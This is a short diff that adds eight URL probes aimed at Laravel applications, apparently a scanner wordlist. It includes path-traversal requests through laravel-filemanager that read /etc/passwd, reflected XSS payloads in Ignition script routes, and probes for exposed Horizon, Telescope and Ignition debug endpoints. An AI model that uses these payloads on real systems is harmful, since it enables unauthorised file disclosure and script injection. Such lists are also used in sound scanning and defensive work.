@@ -1,0 +1,8 @@
+/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd
+/laravel-filemanager/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd
+/_ignition/health-check
+/api/stats
+/horizon/api/stats
+/_ignition/scripts/--><svg%20onload=alert(document.domain)>
+/telescope/requests
+/_ignition/scripts/--><svg%20onload=alert(1337)>
